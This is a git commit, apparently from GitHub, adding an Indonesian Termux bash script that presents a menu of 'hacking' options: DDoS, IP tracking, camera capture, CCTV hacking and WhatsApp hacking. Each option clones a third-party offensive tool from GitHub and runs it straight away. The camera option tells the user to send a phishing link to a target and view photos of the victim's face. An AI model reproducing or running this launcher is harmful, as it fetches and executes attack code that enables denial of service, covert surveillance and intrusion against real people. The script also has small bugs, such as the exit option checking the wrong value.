249f4a42ba61d2bb280823986b9584c0f0fe5ff9
S1nt4x16 <50811498+S1nt4x16@users.noreply.github.com>
2019-05-20 20:59:02 +0700

    New Upload
    Baru Nih Ashiapp Santuy

---
+++ Tools-VR.sh
@@ -0,0 +1,85 @@
+clear
+figlet Tools-VR | lolcat
+echo "========================================
+# Created By : Valentinus Moreno
+
+# Name : Synt4x16
+
+# Lanjut Trs Gan Buat Temen Kesel
+
+# Ajak pacar Temen Atau Pacar Temen Eh :v
+
+============================================" | lolcat
+
+sleep 2
+
+echo "(1) DDOS
+(2) Ip Tracker Nya 
+(3) Kamera 
+(4) Cctv Hacking
+(5) WhatsHack (30% Succes)
+(6) Exit" | lolcat 
+echo " (+) Pilih Nomor Nya : " | lolcat 
+read nomor
+
+if [ $nomor = 1 ] || [$nomor = 01 ]
+then
+clear
+pkg install git
+pkg install python2
+git clone https://github.com/4L13199/LITEDDOS
+cd LITEDDOS
+python2 LITEDDOS.py
+fi
+
+if [ $nomor = 2 ] || [ $nomor = 02 ]
+then
+clear
+pkg install git
+pkg install php
+pkg install openssh
+pkg install bash
+git clone https://github.com/thelinuxchoice/locator
+cd locator
+bash locator.sh
+fi
+
+if [ $nomor = 3 ] || [ $nomor = 03 ]
+then
+clear
+pkg install git
+pkg install mc
+pkg install openssh
+pkg install bash
+git clone https://github.com/thelinuxchoice/saycheese
+cd saycheese
+bash saycheese.sh
+echo "Tulis Nama Link Nya Mau Apa Terus Kirim Ke Target Dan Buka New Sesion Tulis Mc Cari Cam**********.png Copy Ke /Sdcard Dan Liat Muka Orang Nya" | lolcat
+fi
+
+if [ $nomor = 4 ] || [ $nomor = 04 ]
+then
+clear
+pkg install git
+git clone https://github.com/zlucifer/all_seeing
+cd all_seeing
+chmod +x cctv.sh
+termux-fix-shebang cctv.sh
+./cctv.sh
+fi
+
+if [ $nomor = 5 ] || [ $nomor = 05 ]
+then
+clear
+pkg install git
+git clone https://github.com/AndriGanz/whatshack
+cd whatshack
+sh whatshack.sh
+fi
+
+if [ $nomor = 6 ] || [ $nomor = 02 ]
+then
+clear
+echo "Created By : Synt4x16" | lolcat 
+exit
+fi
